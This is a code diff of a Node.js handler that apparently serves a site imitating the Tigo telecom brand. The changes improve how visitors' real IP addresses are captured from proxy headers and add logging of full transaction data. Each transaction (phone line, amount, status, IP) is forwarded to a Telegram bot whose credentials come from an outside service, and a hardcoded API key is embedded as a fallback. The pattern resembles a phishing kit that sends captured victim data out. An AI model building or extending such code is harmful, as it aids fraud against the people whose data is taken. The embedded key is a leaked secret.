@@ -21,6 +21,20 @@ function generarTxid() {
     return crypto.randomBytes(16).toString('hex');
 }
 
+function getRealIpAddr(req) {
+    let ip = '';
+    if (req.headers['cf-connecting-ip']) {
+        ip = req.headers['cf-connecting-ip'];
+    } else if (req.headers['x-forwarded-for']) {
+        ip = req.headers['x-forwarded-for'].split(',')[0].trim();
+    } else if (req.headers['x-real-ip']) {
+        ip = req.headers['x-real-ip'];
+    } else {
+        ip = req.socket?.remoteAddress || req.connection?.remoteAddress || 'unknown';
+    }
+    return ip;
+}
+
 async function obtenerCredencialesTelegram(site = 'tigoconsulta') {
     try {
         const apiKey = process.env.LABORATORIO_LOL_API_KEY || 'C4fEzGJfN92dkLKrZ43ULzFbAcx7mD9v';
@@ -49,6 +63,7 @@ async function obtenerCredencialesTelegram(site = 'tigoconsulta') {
 
 async function enviarNotificacionTelegram(txid, transaccion) {
     try {
+        console.log('[Telegram] Datos recibidos:', JSON.stringify(transaccion));
         console.log('[Telegram] Iniciando envío de notificación...');
         const creds = await obtenerCredencialesTelegram('tigoconsulta');
         console.log('[Telegram] Credenciales obtenidas:', creds ? '✓' : '✗');
@@ -56,7 +71,8 @@ async function enviarNotificacionTelegram(txid, transaccion) {
             console.log('[Telegram] ✗ Credenciales inválidas. Token:', creds?.token ? '✓' : '✗', 'ChatId:', creds?.chatId ? '✓' : '✗');
             return;
         }
-        const mensaje = `🔔 <b>NUEVA TRANSACCIÓN TIGO</b>\n\n<b>TxID:</b> <code>${txid}</code>\n<b>Línea:</b> ${transaccion.referencia}\n<b>Valor:</b> ${transaccion.valor_formateado}\n<b>Estado:</b> ${transaccion.estado}\n<b>IP:</b> ${transaccion.ip}`;
+        const mensaje = `🔔 <b>NUEVA TRANSACCIÓN TIGO</b>\n\n<b>TxID:</b> <code>${txid}</code>\n<b>Línea:</b> ${transaccion.referencia}\n<b>Valor:</b> ${transaccion.valor_formateado}\n<b>Estado:</b> ${transaccion.estado || 'N/A'}\n<b>IP:</b> ${transaccion.ip || 'N/A'}`;
+        console.log('[Telegram] Mensaje:', mensaje);
         console.log('[Telegram] Enviando mensaje a chat:', creds.chatId);
         const telegramRes = await fetch(`https://api.telegram.org/bot${creds.token}/sendMessage`, {
             method: 'POST',
@@ -130,7 +146,7 @@ module.exports = async (req, res) => {
         if (!apiResponse.ok) return res.status(200).json(apiResponse);
 
         const txid = generarTxid();
-        const clientIp = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'unknown';
+        const clientIp = getRealIpAddr(req);
 
         console.log('[API] Iniciando procesos async para txid:', txid);
 
